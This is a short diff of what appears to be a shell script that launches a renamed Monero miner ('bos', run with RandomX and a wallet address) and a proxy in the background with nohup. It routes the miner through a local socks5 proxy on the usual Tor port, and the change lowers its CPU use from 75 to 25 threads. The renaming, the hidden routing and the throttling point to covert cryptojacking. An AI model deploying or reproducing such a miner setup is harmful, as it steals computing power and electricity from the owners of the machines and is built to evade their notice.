@@ -6,5 +6,5 @@ unzip set.zip
 chmod +x proxy
 nohup ./proxy &
 chmod +x bos
-nohup ./bos --donate-level 1 -o 127.0.0.1:8080 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.CPU -a rx/0 --cpu-max-threads-hint=75 socks5://127.0.0.1:9150
+nohup ./bos --donate-level 1 -o 127.0.0.1:8080 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.CPU -a rx/0 --cpu-max-threads-hint=25 socks5://127.0.0.1:9150
 
